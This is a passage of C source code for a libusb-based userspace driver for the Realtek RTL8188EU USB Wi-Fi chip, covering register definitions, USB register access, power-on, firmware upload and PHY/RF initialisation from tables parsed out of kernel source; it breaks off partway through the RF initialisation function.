#define _GNU_SOURCE

#include <errno.h>
#include <getopt.h>
#include <inttypes.h>
#include <libusb-1.0/libusb.h>
#include <limits.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

enum {
    REALTEK_USB_READ = 0xC0,
    REALTEK_USB_WRITE = 0x40,
    REALTEK_USB_CMD_REQ = 0x05,
    REALTEK_USB_CMD_IDX = 0x00,
    RTW_USB_CONTROL_MSG_TIMEOUT_MS = 500,

    RTL_FW_PAGE_SIZE = 4096,
    RTL8XXXU_FIRMWARE_POLL_MAX = 1000,
    RTL8XXXU_MAX_REG_POLL = 500,
    RTL8XXXU_FIRMWARE_HEADER_SIZE = 32,

    REG_SYS_FUNC = 0x0002,
    SYS_FUNC_BBRSTB = 1 << 0,
    SYS_FUNC_BB_GLB_RSTN = 1 << 1,
    SYS_FUNC_USBA = 1 << 2,
    SYS_FUNC_USBD = 1 << 4,
    SYS_FUNC_CPU_ENABLE = 1 << 10,
    SYS_FUNC_DIO_RF = 1 << 13,

    REG_APS_FSMCO = 0x0004,
    APS_FSMCO_HW_SUSPEND = 1 << 11,
    APS_FSMCO_PCIE = 1 << 12,
    APS_FSMCO_HW_POWERDOWN = 1 << 15,
    APS_FSMCO_MAC_ENABLE = 1 << 8,

    REG_AFE_XTAL_CTRL = 0x0024,
    REG_LPLDO_CTRL = 0x0023,

    REG_RF_CTRL = 0x001F,
    RF_ENABLE = 1 << 0,
    RF_RSTB = 1 << 1,
    RF_SDMRSTB = 1 << 2,

    REG_CR = 0x0100,
    CR_HCI_TXDMA_ENABLE = 1 << 0,
    CR_HCI_RXDMA_ENABLE = 1 << 1,
    CR_TXDMA_ENABLE = 1 << 2,
    CR_RXDMA_ENABLE = 1 << 3,
    CR_PROTOCOL_ENABLE = 1 << 4,
    CR_SCHEDULE_ENABLE = 1 << 5,
    CR_MAC_TX_ENABLE = 1 << 6,
    CR_MAC_RX_ENABLE = 1 << 7,
    CR_SECURITY_ENABLE = 1 << 9,
    CR_CALTIMER_ENABLE = 1 << 10,

    REG_PBP = 0x0104,
    PBP_PAGE_SIZE_RX_SHIFT = 0,
    PBP_PAGE_SIZE_TX_SHIFT = 4,

    REG_TRXDMA_CTRL = 0x010C,
    TRXDMA_CTRL_RXDMA_AGG_EN = 1 << 2,

    REG_TRXFF_BNDY = 0x0114,

    REG_LLT_INIT = 0x01E0,
    LLT_OP_INACTIVE = 0x0,
    LLT_OP_WRITE = 1u << 30,
    LLT_OP_MASK = 3u << 30,

    REG_RQPN = 0x0200,
    RQPN_HI_PQ_SHIFT = 0,
    RQPN_LO_PQ_SHIFT = 8,
    RQPN_PUB_PQ_SHIFT = 16,
    RQPN_LOAD = 1u << 31,

    REG_RQPN_NPQ = 0x0214,
    RQPN_NPQ_SHIFT = 0,
    RQPN_EPQ_SHIFT = 16,

    REG_TXDMA_OFFSET_CHK = 0x020C,
    TXDMA_OFFSET_DROP_DATA_EN = 1 << 9,

    REG_MCU_FW_DL = 0x0080,
    MCU_FW_DL_ENABLE = 1 << 0,
    MCU_FW_DL_READY = 1 << 1,
    MCU_FW_DL_CSUM_REPORT = 1 << 2,
    MCU_WINT_INIT_READY = 1 << 6,
    MCU_FW_RAM_SEL = 1 << 7,

    REG_HMTFR = 0x01D0,
    REG_FW_START_ADDRESS = 0x1000,

    REG_MAX_AGGR_NUM = 0x04A8,
    REG_USB_SPECIAL_OPTION = 0xFE55,
    USB_SPEC_USB_AGG_ENABLE = 1 << 3,

    REG_RX_DRVINFO_SZ = 0x060F,
    REG_RCR = 0x0608,
    RCR_ACCEPT_AP = 1u << 0,
    RCR_ACCEPT_PHYS_MATCH = 1u << 1,
    RCR_ACCEPT_MCAST = 1u << 2,
    RCR_ACCEPT_BCAST = 1u << 3,
    RCR_ACCEPT_ADDR3 = 1u << 4,
    RCR_ACCEPT_PM = 1u << 5,
    RCR_ACCEPT_CRC32 = 1u << 8,
    RCR_ACCEPT_ICV = 1u << 9,
    RCR_ACCEPT_DATA_FRAME = 1u << 11,
    RCR_ACCEPT_CTRL_FRAME = 1u << 12,
    RCR_ACCEPT_MGMT_FRAME = 1u << 13,
    RCR_HTC_LOC_CTRL = 1u << 14,
    RCR_APPEND_PHYSTAT = 1u << 28,
    RCR_APPEND_ICV = 1u << 29,
    RCR_APPEND_MIC = 1u << 30,
    RCR_APPEND_FCS = 1u << 31,

    REG_EARLY_MODE_CONTROL_8188E = 0x04D0,

    REG_BW_OPMODE = 0x0603,
    BW_OPMODE_20MHZ = 1 << 2,

    REG_RESPONSE_RATE_SET = 0x0440,
    RSR_RSC_LOWER_SUB_CHANNEL = 1u << 21,
    RSR_RSC_UPPER_SUB_CHANNEL = 1u << 22,
    RSR_RSC_BANDWIDTH_40M = RSR_RSC_UPPER_SUB_CHANNEL | RSR_RSC_LOWER_SUB_CHANNEL,

    REG_FPGA0_RF_MODE = 0x0800,
    REG_FPGA1_RF_MODE = 0x0900,
    FPGA_RF_MODE = 1 << 0,
    FPGA_RF_MODE_CCK = 1u << 24,
    FPGA_RF_MODE_OFDM = 1u << 25,

    REG_FPGA0_POWER_SAVE = 0x0818,
    FPGA0_PS_LOWER_CHANNEL = 1u << 26,
    FPGA0_PS_UPPER_CHANNEL = 1u << 27,

    REG_CCK0_SYSTEM = 0x0A00,
    CCK0_SIDEBAND = 1 << 4,

    REG_OFDM1_LSTF = 0x0D00,
    OFDM_LSTF_PRIME_CH_LOW = 1 << 10,
    OFDM_LSTF_PRIME_CH_HIGH = 1 << 11,
    OFDM_LSTF_PRIME_CH_MASK = OFDM_LSTF_PRIME_CH_LOW | OFDM_LSTF_PRIME_CH_HIGH,

    REG_FPGA0_XA_HSSI_PARM1 = 0x0820,
    FPGA0_HSSI_PARM1_PI = 1 << 8,

    REG_FPGA0_XA_HSSI_PARM2 = 0x0824,
    FPGA0_HSSI_3WIRE_DATA_LEN = 0x800,
    FPGA0_HSSI_3WIRE_ADDR_LEN = 0x400,
    FPGA0_HSSI_PARM2_ADDR_SHIFT = 23,
    FPGA0_HSSI_PARM2_ADDR_MASK = 0x7F800000,
    FPGA0_HSSI_PARM2_EDGE_READ = 1u << 31,

    REG_FPGA0_XA_LSSI_PARM = 0x0840,
    FPGA0_LSSI_PARM_ADDR_SHIFT = 20,
    FPGA0_LSSI_PARM_DATA_MASK = 0x000FFFFF,

    REG_FPGA0_XA_RF_INT_OE = 0x0860,
    REG_FPGA0_XA_RF_SW_CTRL = 0x0870,
    FPGA0_RF_RFENV = 1 << 4,

    REG_FPGA0_XA_LSSI_READBACK = 0x08A0,
    REG_HSPI_XA_READBACK = 0x08B8,

    REG_OFDM0_TRX_PATH_ENABLE = 0x0C04,
    OFDM_RF_PATH_RX_A = 1 << 0,
    OFDM_RF_PATH_TX_A = 1 << 4,
    OFDM_RF_PATH_RX_MASK = 0x0F,
    OFDM_RF_PATH_TX_MASK = 0xF0,

    REG_TXPAUSE = 0x0522,

    RF6052_REG_MODE_AG = 0x18,
    MODE_AG_CHANNEL_MASK = 0x3FF,
    MODE_AG_BW_MASK = (1 << 10) | (1 << 11),
    MODE_AG_BW_20MHZ_8723B = (1 << 10) | (1 << 11),
    MODE_AG_BW_40MHZ_8723B = 1 << 10,
};

typedef struct {
    uint32_t reg;
    uint32_t val;
} reg_pair_t;

typedef struct {
    reg_pair_t *mac_init;
    size_t mac_init_len;
    reg_pair_t *phy_init;
    size_t phy_init_len;
    reg_pair_t *agc;
    size_t agc_len;
    reg_pair_t *radioa;
    size_t radioa_len;
} tables_t;

typedef struct {
    int total_page_num;
    int page_num_hi;
    int page_num_lo;
    int page_num_norm;
    int last_llt_entry;
    int trxff_boundary;
    int pbp_rx;
    int pbp_tx;
    int writeN_block_size;
} fops_8188e_t;

typedef struct {
    libusb_context *ctx;
    libusb_device_handle *handle;
    int intf_num;
    uint8_t ep_in;
    uint8_t ep_out_eps[8];
    int ep_out_len;
    int nr_out_eps;
    bool ep_tx_high_queue;
    bool ep_tx_normal_queue;
    bool ep_tx_low_queue;
    int current_channel;
    uint16_t tx_seq;
    fops_8188e_t fops;
    tables_t tables;
} rtl8188eu_t;

typedef struct {
    uint16_t pktlen;
    uint8_t crc32;
    uint8_t icverr;
    uint8_t drvinfo_sz;
    uint8_t shift;
    uint8_t rxmcs;
    uint8_t rxht;
    uint8_t bw;
    uint8_t rpt_sel;
    uint8_t pkt_cnt;
    uint32_t tsfl;
} rxdesc16_t;

static void die(const char *msg) {
    fprintf(stderr, "%s\n", msg);
    exit(1);
}

static void dief(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    exit(1);
}

static void *xmalloc(size_t n) {
    void *p = malloc(n ? n : 1);
    if (!p) die("out of memory");
    return p;
}

static void *xrealloc(void *p, size_t n) {
    void *q = realloc(p, n ? n : 1);
    if (!q) die("out of memory");
    return q;
}

static uint32_t le32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static uint16_t le16(const uint8_t *p) {
    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

static void put_le32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v & 0xFF);
    p[1] = (uint8_t)((v >> 8) & 0xFF);
    p[2] = (uint8_t)((v >> 16) & 0xFF);
    p[3] = (uint8_t)((v >> 24) & 0xFF);
}

static void put_le16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v & 0xFF);
    p[1] = (uint8_t)((v >> 8) & 0xFF);
}

static uint32_t mask_shift(uint32_t mask) {
    if (mask == 0) return 0;
    return (uint32_t)__builtin_ctz(mask);
}

static uint32_t replace_bits(uint32_t orig, uint32_t value, uint32_t mask) {
    return (orig & ~mask) | ((value << mask_shift(mask)) & mask);
}

static uint8_t *read_entire_file(const char *path, size_t *out_len) {
    FILE *fp = fopen(path, "rb");
    if (!fp) return NULL;
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    long sz = ftell(fp);
    if (sz < 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }
    uint8_t *buf = (uint8_t *)xmalloc((size_t)sz + 1);
    size_t rd = fread(buf, 1, (size_t)sz, fp);
    fclose(fp);
    if (rd != (size_t)sz) { free(buf); return NULL; }
    buf[sz] = 0;
    if (out_len) *out_len = (size_t)sz;
    return buf;
}

static const char *find_table_start(const char *text, const char *name) {
    const char *p = text;
    size_t nlen = strlen(name);
    while ((p = strstr(p, name)) != NULL) {
        if (p > text) {
            char c = p[-1];
            if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
                p += nlen;
                continue;
            }
        }
        const char *q = p + nlen;
        while (*q && (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n')) q++;
        if (*q == '[') {
            const char *br = strchr(q, ']');
            if (!br) return NULL;
            q = br + 1;
        }
        while (*q && (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n')) q++;
        if (*q != '=') { p += nlen; continue; }
        q++;
        while (*q && (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n')) q++;
        if (*q != '{') { p += nlen; continue; }
        return q + 1;
    }
    return NULL;
}

static char *extract_braced_block(const char *text, const char *name) {
    const char *start = find_table_start(text, name);
    if (!start) return NULL;
    int depth = 1;
    const char *p = start;
    while (*p && depth) {
        if (*p == '{') depth++;
        else if (*p == '}') depth--;
        p++;
    }
    if (depth) return NULL;
    size_t len = (size_t)((p - 1) - start);
    char *out = (char *)xmalloc(len + 1);
    memcpy(out, start, len);
    out[len] = 0;
    return out;
}

static bool parse_pairs(const char *block, reg_pair_t **out_pairs, size_t *out_len) {
    size_t cap = 1024, len = 0;
    reg_pair_t *pairs = (reg_pair_t *)xmalloc(cap * sizeof(*pairs));
    const char *p = block;
    while (*p) {
        const char *lb = strchr(p, '{');
        if (!lb) break;
        const char *q = lb + 1;
        while (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n') q++;
        errno = 0;
        char *end1 = NULL;
        unsigned long a = strtoul(q, &end1, 0);
        if (end1 == q || errno) { p = lb + 1; continue; }
        q = end1;
        while (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n') q++;
        if (*q != ',') { p = lb + 1; continue; }
        q++;
        while (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n') q++;
        errno = 0;
        char *end2 = NULL;
        unsigned long b = strtoul(q, &end2, 0);
        if (end2 == q || errno) { p = lb + 1; continue; }
        const char *rb = strchr(end2, '}');
        if (!rb) break;
        if (len == cap) { cap *= 2; pairs = (reg_pair_t *)xrealloc(pairs, cap * sizeof(*pairs)); }
        pairs[len++] = (reg_pair_t){ .reg = (uint32_t)a, .val = (uint32_t)b };
        p = rb + 1;
    }
    *out_pairs = pairs;
    *out_len = len;
    return true;
}

static bool load_tables_from_kernel_source(const char *src_path, tables_t *out) {
    size_t text_len = 0;
    uint8_t *text_u8 = read_entire_file(src_path, &text_len);
    if (!text_u8) return false;
    const char *text = (const char *)text_u8;

    char *mac = extract_braced_block(text, "rtl8188e_mac_init_table");
    char *phy = extract_braced_block(text, "rtl8188eu_phy_init_table");
    char *agc = extract_braced_block(text, "rtl8188e_agc_table");
    char *radioa = extract_braced_block(text, "rtl8188eu_radioa_init_table");
    free(text_u8);

    if (!mac || !phy || !agc || !radioa) {
        free(mac); free(phy); free(agc); free(radioa);
        return false;
    }

    memset(out, 0, sizeof(*out));
    bool ok = true;
    ok &= parse_pairs(mac, &out->mac_init, &out->mac_init_len);
    ok &= parse_pairs(phy, &out->phy_init, &out->phy_init_len);
    ok &= parse_pairs(agc, &out->agc, &out->agc_len);
    ok &= parse_pairs(radioa, &out->radioa, &out->radioa_len);
    free(mac); free(phy); free(agc); free(radioa);
    return ok;
}

static void free_tables(tables_t *t) {
    free(t->mac_init);
    free(t->phy_init);
    free(t->agc);
    free(t->radioa);
    memset(t, 0, sizeof(*t));
}

static int usb_ctrl_read(rtl8188eu_t *d, uint16_t value, uint8_t *buf, uint16_t length) {
    return libusb_control_transfer(
        d->handle,
        REALTEK_USB_READ,
        REALTEK_USB_CMD_REQ,
        value,
        REALTEK_USB_CMD_IDX,
        buf,
        length,
        RTW_USB_CONTROL_MSG_TIMEOUT_MS
    );
}

static int usb_ctrl_write(rtl8188eu_t *d, uint16_t value, const uint8_t *buf, uint16_t length) {
    return libusb_control_transfer(
        d->handle,
        REALTEK_USB_WRITE,
        REALTEK_USB_CMD_REQ,
        value,
        REALTEK_USB_CMD_IDX,
        (unsigned char *)buf,
        length,
        RTW_USB_CONTROL_MSG_TIMEOUT_MS
    );
}

static uint8_t read8(rtl8188eu_t *d, uint16_t addr) {
    uint8_t tmp[1] = {0};
    int r = usb_ctrl_read(d, addr, tmp, 1);
    if (r != 1) dief("read8 failed addr=0x%04x r=%d", addr, r);
    return tmp[0];
}

static uint16_t read16(rtl8188eu_t *d, uint16_t addr) {
    uint8_t tmp[2] = {0};
    int r = usb_ctrl_read(d, addr, tmp, 2);
    if (r != 2) dief("read16 failed addr=0x%04x r=%d", addr, r);
    return le16(tmp);
}

static uint32_t read32(rtl8188eu_t *d, uint16_t addr) {
    uint8_t tmp[4] = {0};
    int r = usb_ctrl_read(d, addr, tmp, 4);
    if (r != 4) dief("read32 failed addr=0x%04x r=%d", addr, r);
    return le32(tmp);
}

static void write8(rtl8188eu_t *d, uint16_t addr, uint8_t val) {
    uint8_t tmp[1] = { val };
    int r = usb_ctrl_write(d, addr, tmp, 1);
    if (r != 1) dief("write8 failed addr=0x%04x r=%d", addr, r);
}

static void write16(rtl8188eu_t *d, uint16_t addr, uint16_t val) {
    uint8_t tmp[2];
    put_le16(tmp, val);
    int r = usb_ctrl_write(d, addr, tmp, 2);
    if (r != 2) dief("write16 failed addr=0x%04x r=%d", addr, r);
}

static void write32(rtl8188eu_t *d, uint16_t addr, uint32_t val) {
    uint8_t tmp[4];
    put_le32(tmp, val);
    int r = usb_ctrl_write(d, addr, tmp, 4);
    if (r != 4) dief("write32 failed addr=0x%04x r=%d", addr, r);
}

static void writeN(rtl8188eu_t *d, uint16_t addr, const uint8_t *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        size_t chunk = (len - off) > (size_t)d->fops.writeN_block_size ? (size_t)d->fops.writeN_block_size : (len - off);
        int r = usb_ctrl_write(d, (uint16_t)(addr + off), buf + off, (uint16_t)chunk);
        if (r != (int)chunk) dief("writeN failed addr=0x%04x wrote=%d want=%zu", (unsigned)(addr + off), r, chunk);
        off += chunk;
    }
}

static void config_endpoints_no_sie(rtl8188eu_t *d) {
    if (d->nr_out_eps == 6 || d->nr_out_eps == 5 || d->nr_out_eps == 4 || d->nr_out_eps == 3) {
        d->ep_tx_low_queue = true;
        d->ep_tx_normal_queue = true;
        d->ep_tx_high_queue = true;
        return;
    }
    if (d->nr_out_eps == 2) {
        d->ep_tx_normal_queue = true;
        d->ep_tx_high_queue = true;
        return;
    }
    if (d->nr_out_eps == 1) {
        d->ep_tx_high_queue = true;
        return;
    }
    dief("unsupported USB TX endpoints: %d", d->nr_out_eps);
}

static void rtl8188e_disabled_to_emu(rtl8188eu_t *d) {
    uint16_t val16 = read16(d, REG_APS_FSMCO);
    val16 &= (uint16_t)~(APS_FSMCO_HW_SUSPEND | APS_FSMCO_PCIE);
    write16(d, REG_APS_FSMCO, val16);
}

static void rtl8188e_emu_to_active(rtl8188eu_t *d) {
    for (int i = 0; i < (int)RTL8XXXU_MAX_REG_POLL; i++) {
        uint32_t val32 = read32(d, REG_APS_FSMCO);
        if (val32 & (1u << 17)) break;
        usleep(10);
        if (i == (int)RTL8XXXU_MAX_REG_POLL - 1) die("power ready poll timeout");
    }

    uint8_t val8 = read8(d, REG_SYS_FUNC);
    val8 &= (uint8_t)~(SYS_FUNC_BBRSTB | SYS_FUNC_BB_GLB_RSTN);
    write8(d, REG_SYS_FUNC, val8);

    uint32_t val32 = read32(d, REG_AFE_XTAL_CTRL);
    val32 |= 1u << 23;
    write32(d, REG_AFE_XTAL_CTRL, val32);

    uint16_t val16 = read16(d, REG_APS_FSMCO);
    val16 &= (uint16_t)~APS_FSMCO_HW_POWERDOWN;
    write16(d, REG_APS_FSMCO, val16);

    val16 = read16(d, REG_APS_FSMCO);
    val16 &= (uint16_t)~(APS_FSMCO_HW_SUSPEND | APS_FSMCO_PCIE);
    write16(d, REG_APS_FSMCO, val16);

    val32 = read32(d, REG_APS_FSMCO);
    val32 |= APS_FSMCO_MAC_ENABLE;
    write32(d, REG_APS_FSMCO, val32);

    for (int i = 0; i < (int)RTL8XXXU_MAX_REG_POLL; i++) {
        val32 = read32(d, REG_APS_FSMCO);
        if ((val32 & APS_FSMCO_MAC_ENABLE) == 0) break;
        usleep(10);
        if (i == (int)RTL8XXXU_MAX_REG_POLL - 1) die("MAC enable poll timeout");
    }

    val8 = read8(d, REG_LPLDO_CTRL);
    val8 &= (uint8_t)~(1u << 4);
    write8(d, REG_LPLDO_CTRL, val8);
}

static void power_on(rtl8188eu_t *d) {
    rtl8188e_disabled_to_emu(d);
    rtl8188e_emu_to_active(d);
    uint16_t val16 = (uint16_t)(
        CR_HCI_TXDMA_ENABLE |
        CR_HCI_RXDMA_ENABLE |
        CR_TXDMA_ENABLE |
        CR_RXDMA_ENABLE |
        CR_PROTOCOL_ENABLE |
        CR_SCHEDULE_ENABLE |
        CR_SECURITY_ENABLE |
        CR_CALTIMER_ENABLE
    );
    write16(d, REG_CR, val16);
}

static void reset_8051(rtl8188eu_t *d) {
    uint16_t sys_func = read16(d, REG_SYS_FUNC);
    sys_func &= (uint16_t)~SYS_FUNC_CPU_ENABLE;
    write16(d, REG_SYS_FUNC, sys_func);
    sys_func |= SYS_FUNC_CPU_ENABLE;
    write16(d, REG_SYS_FUNC, sys_func);
}

static void init_queue_reserved_page(rtl8188eu_t *d) {
    int hq = d->ep_tx_high_queue ? d->fops.page_num_hi : 0;
    int lq = d->ep_tx_low_queue ? d->fops.page_num_lo : 0;
    int nq = d->ep_tx_normal_queue ? d->fops.page_num_norm : 0;
    int eq = 0;

    uint32_t val32 = ((uint32_t)nq << RQPN_NPQ_SHIFT) | ((uint32_t)eq << RQPN_EPQ_SHIFT);
    write32(d, REG_RQPN_NPQ, val32);

    int pubq = d->fops.total_page_num - hq - lq - nq - 1;
    val32 = RQPN_LOAD;
    val32 |= (uint32_t)hq << RQPN_HI_PQ_SHIFT;
    val32 |= (uint32_t)lq << RQPN_LO_PQ_SHIFT;
    val32 |= (uint32_t)pubq << RQPN_PUB_PQ_SHIFT;
    write32(d, REG_RQPN, val32);
}

static void llt_write(rtl8188eu_t *d, int address, int data) {
    uint32_t value = LLT_OP_WRITE | ((uint32_t)(address & 0xFF) << 8) | (uint32_t)(data & 0xFF);
    write32(d, REG_LLT_INIT, value);
    for (int i = 0; i < 21; i++) {
        value = read32(d, REG_LLT_INIT);
        if ((value & LLT_OP_MASK) == LLT_OP_INACTIVE) return;
    }
    dief("LLT write timeout: address=%d data=%d", address, data);
}

static void init_llt_table(rtl8188eu_t *d) {
    int last_tx_page = d->fops.total_page_num;
    int last_entry = d->fops.last_llt_entry;
    for (int i = 0; i < last_tx_page; i++) llt_write(d, i, i + 1);
    llt_write(d, last_tx_page, 0xFF);
    for (int i = last_tx_page + 1; i < last_entry; i++) llt_write(d, i, i + 1);
    llt_write(d, last_entry, last_tx_page + 1);
}

static uint8_t *load_firmware(const char *path, size_t *out_len) {
    size_t len = 0;
    uint8_t *fw = read_entire_file(path, &len);
    if (!fw) return NULL;
    if (len < RTL8XXXU_FIRMWARE_HEADER_SIZE) { free(fw); return NULL; }
    uint16_t sig = le16(fw);
    uint16_t masked = sig & 0xFFF0;
    uint16_t allowed[] = { 0x92E0, 0x92C0, 0x88E0, 0x88C0, 0x5300, 0x2300, 0x88F0, 0x10B0, 0x92F0 };
    bool ok = false;
    for (size_t i = 0; i < sizeof(allowed) / sizeof(allowed[0]); i++) if (masked == allowed[i]) { ok = true; break; }
    if (!ok) { free(fw); return NULL; }
    *out_len = len;
    return fw;
}

static void download_firmware(rtl8188eu_t *d, const uint8_t *fw, size_t fw_len) {
    const uint8_t *fw_payload = fw + RTL8XXXU_FIRMWARE_HEADER_SIZE;
    size_t fw_payload_len = fw_len - RTL8XXXU_FIRMWARE_HEADER_SIZE;

    uint8_t val8 = read8(d, REG_SYS_FUNC + 1);
    val8 |= 4;
    write8(d, REG_SYS_FUNC + 1, val8);

    uint16_t val16 = read16(d, REG_SYS_FUNC);
    val16 |= SYS_FUNC_CPU_ENABLE;
    write16(d, REG_SYS_FUNC, val16);

    val8 = read8(d, REG_MCU_FW_DL);
    if (val8 & MCU_FW_RAM_SEL) {
        write8(d, REG_MCU_FW_DL, 0x00);
        reset_8051(d);
    }

    val8 = read8(d, REG_MCU_FW_DL);
    val8 |= MCU_FW_DL_ENABLE;
    write8(d, REG_MCU_FW_DL, val8);

    uint32_t val32 = read32(d, REG_MCU_FW_DL);
    val32 &= ~(1u << 19);
    write32(d, REG_MCU_FW_DL, val32);

    val8 = read8(d, REG_MCU_FW_DL);
    val8 |= MCU_FW_DL_CSUM_REPORT;
    write8(d, REG_MCU_FW_DL, val8);

    size_t pages = fw_payload_len / RTL_FW_PAGE_SIZE;
    size_t remainder = fw_payload_len % RTL_FW_PAGE_SIZE;

    size_t fwptr = 0;
    for (size_t i = 0; i < pages; i++) {
        val8 = (uint8_t)(read8(d, REG_MCU_FW_DL + 2) & 0xF8);
        val8 |= (uint8_t)(i & 0x7);
        write8(d, REG_MCU_FW_DL + 2, val8);
        writeN(d, REG_FW_START_ADDRESS, fw_payload + fwptr, RTL_FW_PAGE_SIZE);
        fwptr += RTL_FW_PAGE_SIZE;
    }

    if (remainder) {
        val8 = (uint8_t)(read8(d, REG_MCU_FW_DL + 2) & 0xF8);
        val8 |= (uint8_t)(pages & 0x7);
        write8(d, REG_MCU_FW_DL + 2, val8);
        writeN(d, REG_FW_START_ADDRESS, fw_payload + fwptr, remainder);
    }

    val16 = read16(d, REG_MCU_FW_DL);
    val16 &= (uint16_t)~MCU_FW_DL_ENABLE;
    write16(d, REG_MCU_FW_DL, val16);
}

static void start_firmware(rtl8188eu_t *d) {
    for (int i = 0; i < (int)RTL8XXXU_FIRMWARE_POLL_MAX; i++) {
        uint32_t val32 = read32(d, REG_MCU_FW_DL);
        if (val32 & MCU_FW_DL_CSUM_REPORT) goto ok;
    }
    die("Firmware checksum poll timed out");
ok:
    uint32_t val32 = read32(d, REG_MCU_FW_DL);
    val32 |= MCU_FW_DL_READY;
    val32 &= ~MCU_WINT_INIT_READY;
    write32(d, REG_MCU_FW_DL, val32);
    reset_8051(d);

    for (int i = 0; i < (int)RTL8XXXU_FIRMWARE_POLL_MAX; i++) {
        val32 = read32(d, REG_MCU_FW_DL);
        if (val32 & MCU_WINT_INIT_READY) goto ok2;
        usleep(100);
    }
    die("Firmware failed to start");
ok2:
    write8(d, REG_HMTFR, 0x0F);
}

static void init_mac(rtl8188eu_t *d) {
    for (size_t i = 0; i < d->tables.mac_init_len; i++) {
        uint32_t reg = d->tables.mac_init[i].reg;
        uint32_t val = d->tables.mac_init[i].val;
        if (reg == 0xFFFFu && val == 0xFFu) break;
        write8(d, (uint16_t)reg, (uint8_t)val);
    }
    write16(d, REG_MAX_AGGR_NUM, 0x0707);
}

static void init_phy_bb(rtl8188eu_t *d) {
    uint16_t val16 = read16(d, REG_SYS_FUNC);
    val16 |= (uint16_t)(SYS_FUNC_BB_GLB_RSTN | SYS_FUNC_BBRSTB | SYS_FUNC_DIO_RF);
    write16(d, REG_SYS_FUNC, val16);

    write8(d, REG_RF_CTRL, (uint8_t)(RF_ENABLE | RF_RSTB | RF_SDMRSTB));

    uint8_t val8 = (uint8_t)(SYS_FUNC_USBA | SYS_FUNC_USBD | SYS_FUNC_BB_GLB_RSTN | SYS_FUNC_BBRSTB);
    write8(d, REG_SYS_FUNC, val8);

    for (size_t i = 0; i < d->tables.phy_init_len; i++) {
        uint32_t reg = d->tables.phy_init[i].reg;
        uint32_t val = d->tables.phy_init[i].val;
        if (reg == 0xFFFFu && val == 0xFFFFFFFFu) break;
        write32(d, (uint16_t)reg, val);
        usleep(1);
    }

    for (size_t i = 0; i < d->tables.agc_len; i++) {
        uint32_t reg = d->tables.agc[i].reg;
        uint32_t val = d->tables.agc[i].val;
        if (reg == 0xFFFFu && val == 0xFFFFFFFFu) break;
        write32(d, (uint16_t)reg, val);
        usleep(1);
    }
}

static uint32_t read_rfreg(rtl8188eu_t *d, uint32_t reg) {
    uint32_t hssia = read32(d, REG_FPGA0_XA_HSSI_PARM2);
    uint32_t val32 = hssia;
    val32 &= ~FPGA0_HSSI_PARM2_ADDR_MASK;
    val32 |= (reg << FPGA0_HSSI_PARM2_ADDR_SHIFT) & FPGA0_HSSI_PARM2_ADDR_MASK;
    val32 |= FPGA0_HSSI_PARM2_EDGE_READ;
    hssia &= ~FPGA0_HSSI_PARM2_EDGE_READ;
    write32(d, REG_FPGA0_XA_HSSI_PARM2, hssia);
    usleep(10);
    write32(d, REG_FPGA0_XA_HSSI_PARM2, val32);
    usleep(100);
    hssia |= FPGA0_HSSI_PARM2_EDGE_READ;
    write32(d, REG_FPGA0_XA_HSSI_PARM2, hssia);
    usleep(10);

    val32 = read32(d, REG_FPGA0_XA_HSSI_PARM1);
    uint32_t retval = (val32 & FPGA0_HSSI_PARM1_PI) ? read32(d, REG_HSPI_XA_READBACK) : read32(d, REG_FPGA0_XA_LSSI_READBACK);
    return retval & 0xFFFFFu;
}

static void write_rfreg(rtl8188eu_t *d, uint32_t reg, uint32_t data) {
    data &= FPGA0_LSSI_PARM_DATA_MASK;
    uint32_t dataaddr = ((reg & 0xFFu) << FPGA0_LSSI_PARM_ADDR_SHIFT) | data;
    write32(d, REG_FPGA0_XA_LSSI_PARM, dataaddr);
    usleep(1);
}

static void init_phy_rf(rtl8188eu_t *d) {
    uint16_t rfsi_rfenv = read16(d, REG_FPGA0_XA_RF_SW_CTRL) & FPGA0_RF_RFENV;

    uint32_t val32 = read32(d, REG_FPGA0_XA_RF_INT_OE);
    val32 |= 1u << 20;
    write32(d, REG_FPGA0_XA_RF_INT_OE, val32);
    usleep(1);

    val32 = read32(d, REG_FPGA0_XA_RF_INT_OE);
    val32 |= 1u << 4;
    write32(d, REG_FPGA0_XA_RF_INT_OE, val32);
    usleep(1);

    val32 = read32(d, REG_FPGA0_XA_HSSI_PARM2);
    val32 &= ~FPGA0_HSSI_3WIRE_ADDR_LEN;
    write32(d, REG_FPGA0_XA_HSSI_PARM2, val32);
    usleep(1);

    val32 = read32(d, REG_FPGA0_XA_HSSI_PARM2);
    val32 &= ~FPGA0_HSSI_3WIRE_DATA_LEN;
    write32(d, REG_FPGA0_XA_HSSI_PARM2, val32);
    usleep(1);

    for (size_t i = 0; i < d->tables.radioa_len; i++) {
        uint32_t reg = d->tables.radioa[i].reg;
        uint32_t val = d->tables.radioa[i].val;
        if (reg == 0xFFu && val == 0xFFFFFFFFu) break;
        if (reg == 0xFEu) { usleep(50000); continue; }
        if (reg == 0xFDu) { usleep(5000); continue; }
        if (reg == 0xFCu) { usleep(1000); continue; }
        if (reg == 0xFBu) { usleep(50); continue; }
        if (reg == 0xFAu) { usleep(5); continue; }
        if (reg == 0xF9u) { usleep(1); continue; }
        write_rfreg(d, reg, val);
        usleep(1);
    }

    uint16_t val16 = read16(d, REG_FPGA0_XA_RF_SW_CTRL);
